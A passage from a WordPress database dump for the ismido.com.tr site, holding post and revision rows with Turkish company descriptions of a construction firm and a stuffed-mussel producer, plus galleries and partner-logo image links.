Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Kurumsal","","inherit","open","open","","497-revision-v1","","","2014-08-29 22:29:35","2014-08-29 19:29:35","","497","http://www.ismido.com.tr/497-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("944","1","2014-08-29 22:47:43","2014-08-29 19:47:43","<p class=\"style2\" style=\"text-align: left;\" align=\"center\"><strong><span class=\"style22\">ARADIĞINIZ SAĞLIKLI MİDYE</span><em>

</em></strong><span class=\"style6\">İSTANBUL MİDYE DOLMA</span></p>
<p class=\"style14\" style=\"text-align: left;\" align=\"center\"><strong><span class=\"style15\">
</span></strong><span class=\"style16\">Sürekli gelişme ve kendini yenileme felsefesine uygun olarak mükemmellik modelini yakalamak üzere Türkiye\'nin kendi çapında en büyük tesisini kurarak çalışmalarımıza 01 EKİM 2006 tarihinde başladık. Tesisimizde tamamen steril ortamda tüm hassasiyetimizi koruyarak gıda mühendislerinin kontrolörlüğü eşliğinde günlük 30.000 midye dolma hazırlanmaktadır. Bu kapasite en kısa zamanda günlük 75.000 adet olarak hedeflenmektedir. Bu hedefler sadece iç piyasa için olup ihracat çalışmalarımız da devam etmektedir.</span></p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">Ürünlerimizi tamamen kendi teknelerimizle ve dalgıçlarımızla Türkiye\'nin nadir bölgelerinden temin etmekteyiz.</p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">Tesisimizde işlenen ürünler ilk olarak Tarım ve Köy İşleri Bakanlığının laboratuarlarında tüm analizleri yapılmaktadır.</p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">Midye içerisine özenle hazırlanan iç pilav malzemesi konulur ve pişirilir. Midyeler hazır hale geldikten sonra 10\'lu, 15\'li, 25 ve 50\'li paketlerde vakumlanır. İşlenen midyeler günlük ve taze olarak sizlerin damak zevkinize hazır hale getirilmektedir.</p>
<p class=\"style13\" style=\"text-align: left;\" align=\"center\">14-17 Şubat 2007 tarihlerinde Antalya expo center de düzenlenen gıda fuarında Türkiye\'nin saygın firmaları ile tanışma ve iş birliği çalışmalarımızın temelini attık. 31 Ekim - 3 Ekim 2007 tarihleri arasında İstanbul CNR fuar merkezinde 15. Uluslararası gıda ürünleri ve teknolojileri fuarına katıldık.</p>
<p class=\"style8\" style=\"text-align: left;\">ÜRÜNLERİMİZ</p>

<ul>
 	<li class=\"style13\" style=\"text-align: left;\">MİDYE DOLMA</li>
 	<li class=\"style13\" style=\"text-align: left;\">İÇ MİDYE</li>
 	<li class=\"style10\"><span class=\"style12\">KARA MİDYE</span>
<p class=\"style8\" style=\"text-align: left;\"><strong>BELGELERİMİZ</strong></p>

<ul class=\"style1\">
 	<li class=\"style13\" style=\"text-align: left;\">T.C.Tarım ve Köy İşleri Bakanlığı Antalya İl Müdürlüğünün 29.12.2006 tarihli ve G07-1033-G-00001 sayılı izniyle üretilmiştir.</li>
 	<li class=\"style13\" style=\"text-align: left;\">T.C.Antalya Kepez Belediyesi gıda sicil belgesi</li>
 	<li class=\"style13\" style=\"text-align: left;\">İSO 22000 ROYAL CERT belgeli</li>
</ul>
</li>
</ul>","Hakkımızda","","publish","open","open","","hakkimizda","","","2016-11-22 23:09:48","2016-11-22 21:09:48","","0","http://www.ismido.com.tr/?page_id=944","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("945","1","2014-08-29 22:47:43","2014-08-29 19:47:43","Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir…
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir…","Herkon Yapı","","inherit","open","open","","944-revision-v1","","","2014-08-29 22:47:43","2014-08-29 19:47:43","","944","http://www.ismido.com.tr/944-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1061","1","2016-11-22 23:51:24","2016-11-22 21:51:24"," ","","","publish","closed","closed","","1061","","","2016-11-22 23:51:24","2016-11-22 21:51:24","","0","http://www.ismido.com.tr/?p=1061","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("946","1","2014-08-29 22:48:07","2014-08-29 19:48:07","[gallery link=\"file\" size=\"medium\" columns=\"4\" ids=\"1071,1072,1076,1077,1078\"]","Belgeler","","publish","open","open","","belgeler","","","2017-01-08 21:08:28","2017-01-08 19:08:28","","0","http://www.ismido.com.tr/?page_id=946","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("1079","1","2017-01-08 21:05:49","2017-01-08 19:05:49","[gallery link=\"file\" ids=\"1071,1072,1076,1077,1078\"]","Belgeler","","inherit","closed","closed","","946-revision-v1","","","2017-01-08 21:05:49","2017-01-08 19:05:49","","946","https://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1054","1","2016-11-22 23:11:58","2016-11-22 21:11:58","<a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/gidasicil.jpg\"><img class=\"alignnone size-full wp-image-1053\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/gidasicil.jpg\" alt=\"gidasicil\" width=\"750\" height=\"1031\" /></a>","Belgeler","","inherit","closed","closed","","946-revision-v1","","","2016-11-22 23:11:58","2016-11-22 21:11:58","","946","http://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1055","1","2016-11-22 23:17:07","2016-11-22 21:17:07","","urunler_1","","inherit","open","closed","","urunler_1","","","2016-11-22 23:17:07","2016-11-22 21:17:07","","186","http://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_1.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1056","1","2016-11-22 23:19:37","2016-11-22 21:19:37","","Ürünler","","inherit","closed","closed","","918-revision-v1","","","2016-11-22 23:19:37","2016-11-22 21:19:37","","918","http://www.ismido.com.tr/918-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1057","1","2016-11-22 23:28:28","2016-11-22 21:28:28","","urunler_2","","inherit","open","closed","","urunler_2","","","2016-11-22 23:28:28","2016-11-22 21:28:28","","184","http://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_2.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1058","1","2016-11-22 23:30:32","2016-11-22 21:30:32","","jumbo_midye_dolma","","inherit","open","closed","","jumbo_midye_dolma","","","2016-11-22 23:30:32","2016-11-22 21:30:32","","182","http://www.ismido.com.tr/wp-content/uploads/2013/10/jumbo_midye_dolma.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1059","1","2016-11-22 23:31:52","2016-11-22 21:31:52","","urunler_4","","inherit","open","closed","","urunler_4","","","2016-11-22 23:31:52","2016-11-22 21:31:52","","177","http://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_4.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("947","1","2014-08-29 22:48:07","2014-08-29 19:48:07","","Çözüm Ortakları","","inherit","open","open","","946-revision-v1","","","2014-08-29 22:48:07","2014-08-29 19:48:07","","946","http://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("948","1","2014-08-29 22:48:52","2014-08-29 19:48:52"," ","","","publish","open","closed","","948","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/?p=948","4","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("949","1","2014-08-29 22:48:52","2014-08-29 19:48:52"," ","","","publish","open","closed","","949","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/?p=949","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("950","1","2014-08-29 22:50:20","2014-08-29 19:50:20","","Kurumsal","","publish","open","closed","","kurumsal","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/?p=950","2","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("987","1","2014-08-29 22:58:10","2014-08-29 19:58:10","<a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/baykaralar.png\"><img class=\"alignnone size-full wp-image-951\" alt=\"baykaralar\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/baykaralar.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/canakkale_seramik.png\"><img class=\"alignnone size-full wp-image-952\" alt=\"canakkale_seramik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/canakkale_seramik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/day_yapi.png\"><img class=\"alignnone size-full wp-image-953\" alt=\"day_yapi\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/day_yapi.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/kabinet.png\"><img class=\"alignnone size-full wp-image-954\" alt=\"kabinet\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/kabinet.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/KlimaPlus.png\"><img class=\"alignnone size-full wp-image-955\" alt=\"KlimaPlus\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/KlimaPlus.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0000_mood.png\"><img class=\"alignnone size-full wp-image-956\" alt=\"logo_0000_mood\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0000_mood.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0001_drlight1.png\"><img class=\"alignnone size-full wp-image-957\" alt=\"logo_0001_drlight1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0001_drlight1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0002_yutas1.png\"><img class=\"alignnone size-full wp-image-958\" alt=\"logo_0002_yutas1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0002_yutas1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0003_vitra.png\"><img class=\"alignnone size-full wp-image-959\" alt=\"logo_0003_vitra\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0003_vitra.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0004_viko1.png\"><img class=\"alignnone size-full wp-image-960\" alt=\"logo_0004_viko1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0004_viko1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0005_siemens1.png\"><img class=\"alignnone size-full wp-image-961\" alt=\"logo_0005_siemens1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0005_siemens1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0007_seranit1.png\"><img class=\"alignnone size-full wp-image-962\" alt=\"logo_0007_seranit1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0007_seranit1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0008_scavolini1.png\"><img class=\"alignnone size-full wp-image-963\" alt=\"logo_0008_scavolini1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0008_scavolini1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0009_rehau1.png\"><img class=\"alignnone size-full wp-image-964\" alt=\"logo_0009_rehau1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0009_rehau1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\"><img class=\"alignnone size-full wp-image-965\" alt=\"logo_0010_onalanlar1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\"><img class=\"alignnone size-full wp-image-966\" alt=\"logo_0011_lineadecor1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0012_legrand1.png\"><img class=\"alignnone size-full wp-image-967\" alt=\"logo_0012_legrand1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0012_legrand1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0013_kommerling1.png\"><img class=\"alignnone size-full wp-image-968\" alt=\"logo_0013_kommerling1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0013_kommerling1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0014_intema.png\"><img class=\"alignnone size-full wp-image-969\" alt=\"logo_0014_intema\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0014_intema.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0015_huni1.png\"><img class=\"alignnone size-full wp-image-970\" alt=\"logo_0015_huni1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0015_huni1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0016_hoppe1.png\"><img class=\"alignnone size-full wp-image-971\" alt=\"logo_0016_hoppe1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0016_hoppe1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\"><img class=\"alignnone size-full wp-image-972\" alt=\"logo_0018_fibrobeton1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0019_betofiber1.png\"><img class=\"alignnone size-full wp-image-973\" alt=\"logo_0019_betofiber1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0019_betofiber1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0020_aparici1.png\"><img class=\"alignnone size-full wp-image-974\" alt=\"logo_0020_aparici1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0020_aparici1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0021_innsu.png\"><img class=\"alignnone size-full wp-image-975\" alt=\"logo_0021_innsu\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0021_innsu.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0022_eskiz.png\"><img class=\"alignnone size-full wp-image-976\" alt=\"logo_0022_eskiz\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0022_eskiz.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0023_toskar.png\"><img class=\"alignnone size-full wp-image-977\" alt=\"logo_0023_toskar\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0023_toskar.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/md_prekast.png\"><img class=\"alignnone size-full wp-image-978\" alt=\"md_prekast\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/md_prekast.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/okcam_mobilya.png\"><img class=\"alignnone size-full wp-image-979\" alt=\"okcam_mobilya\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/okcam_mobilya.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Pimapen-011.png\"><img class=\"alignnone size-full wp-image-980\" alt=\"Pimapen-011\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Pimapen-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seldur_elektrik.png\"><img class=\"alignnone size-full wp-image-981\" alt=\"seldur_elektrik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seldur_elektrik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/serifoglu-011.png\"><img class=\"alignnone size-full wp-image-982\" alt=\"serifoglu-011\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/serifoglu-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\"><img class=\"alignnone size-full wp-image-983\" alt=\"seyithanoglu_ahsap\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/seyithanoglu_ahsap.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\"><img class=\"alignnone size-full wp-image-984\" alt=\"tepe_insaat_malzemeleri\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Winsa-011.png\"><img class=\"alignnone size-full wp-image-985\" alt=\"Winsa-011\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/Winsa-011.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/yuksel_elektrik.png\"><img class=\"alignnone size-full wp-image-986\" alt=\"yuksel_elektrik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/yuksel_elektrik.png\" width=\"173\" height=\"108\" /></a>","Çözüm Ortakları","","inherit","open","open","","946-revision-v1","","","2014-08-29 22:58:10","2014-08-29 19:58:10","","946","http://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("991","1","2017-01-08 21:05:12","2017-01-08 19:05:12","","Belgeler","","inherit","open","open","","946-autosave-v1","","","2017-01-08 21:05:12","2017-01-08 19:05:12","","946","http://www.ismido.com.tr/946-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1080","1","2017-01-08 21:06:32","2017-01-08 19:06:32","[gallery link=\"file\" size=\"medium\" ids=\"1071,1072,1076,1077,1078\"]","Belgeler","","inherit","closed","closed","","946-revision-v1","","","2017-01-08 21:06:32","2017-01-08 19:06:32","","946","https://www.ismido.com.tr/946-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("992","1","2014-08-29 23:11:40","2014-08-29 20:11:40","<a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/baykaralar.png\"><img class=\"alignnone size-full wp-image-951\" alt=\"baykaralar\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/baykaralar.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/canakkale_seramik.png\"><img class=\"alignnone size-full wp-image-952\" alt=\"canakkale_seramik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/canakkale_seramik.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/day_yapi.png\"><img class=\"alignnone size-full wp-image-953\" alt=\"day_yapi\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/day_yapi.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/kabinet.png\"><img class=\"alignnone size-full wp-image-954\" alt=\"kabinet\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/kabinet.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/KlimaPlus.png\"><img class=\"alignnone size-full wp-image-955\" alt=\"KlimaPlus\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/KlimaPlus.png\" width=\"173\" height=\"108\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0000_mood.png\"><img class=\"alignnone size-full wp-image-956\" alt=\"logo_0000_mood\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0000_mood.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0001_drlight1.png\"><img class=\"alignnone size-full wp-image-957\" alt=\"logo_0001_drlight1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0001_drlight1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0002_yutas1.png\"><img class=\"alignnone size-full wp-image-958\" alt=\"logo_0002_yutas1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0002_yutas1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0003_vitra.png\"><img class=\"alignnone size-full wp-image-959\" alt=\"logo_0003_vitra\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0003_vitra.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0004_viko1.png\"><img class=\"alignnone size-full wp-image-960\" alt=\"logo_0004_viko1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0004_viko1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0005_siemens1.png\"><img class=\"alignnone size-full wp-image-961\" alt=\"logo_0005_siemens1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0005_siemens1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0007_seranit1.png\"><img class=\"alignnone size-full wp-image-962\" alt=\"logo_0007_seranit1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0007_seranit1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0008_scavolini1.png\"><img class=\"alignnone size-full wp-image-963\" alt=\"logo_0008_scavolini1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0008_scavolini1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0009_rehau1.png\"><img class=\"alignnone size-full wp-image-964\" alt=\"logo_0009_rehau1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0009_rehau1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\"><img class=\"alignnone size-full wp-image-965\" alt=\"logo_0010_onalanlar1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0010_onalanlar1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\"><img class=\"alignnone size-full wp-image-966\" alt=\"logo_0011_lineadecor1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0011_lineadecor1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0012_legrand1.png\"><img class=\"alignnone size-full wp-image-967\" alt=\"logo_0012_legrand1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0012_legrand1.png\" width=\"200\" height=\"125\" /><a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/ege_seramik.jpg\"><img class=\"alignnone size-full wp-image-988\" alt=\"ege_seramik\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/ege_seramik.jpg\" width=\"250\" height=\"69\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/franke.gif\"><img class=\"alignnone size-full wp-image-989\" alt=\"franke\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/franke.gif\" width=\"130\" height=\"42\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/mitsubishi_klima.png\"><img class=\"alignnone size-full wp-image-990\" alt=\"mitsubishi_klima\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/mitsubishi_klima.png\" width=\"228\" height=\"75\" /></a></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0013_kommerling1.png\"><img class=\"alignnone size-full wp-image-968\" alt=\"logo_0013_kommerling1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0013_kommerling1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0014_intema.png\"><img class=\"alignnone size-full wp-image-969\" alt=\"logo_0014_intema\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0014_intema.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0015_huni1.png\"><img class=\"alignnone size-full wp-image-970\" alt=\"logo_0015_huni1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0015_huni1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0016_hoppe1.png\"><img class=\"alignnone size-full wp-image-971\" alt=\"logo_0016_hoppe1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0016_hoppe1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\"><img class=\"alignnone size-full wp-image-972\" alt=\"logo_0018_fibrobeton1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0019_betofiber1.png\"><img class=\"alignnone size-full wp-image-973\" alt=\"logo_0019_betofiber1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0019_betofiber1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0020_aparici1.png\"><img class=\"alignnone size-full wp-image-974\" alt=\"logo_0020_aparici1\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0020_aparici1.png\" width=\"200\" height=\"125\" /></a> <a href=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0021_innsu.png\"><img class=\"alignnone size-full wp-image-975\" alt=\"logo_0021_innsu\" src=\"http://www.ismido.com.tr/wp-content/uploads/2014/08/logo_0021_innsu.png\" 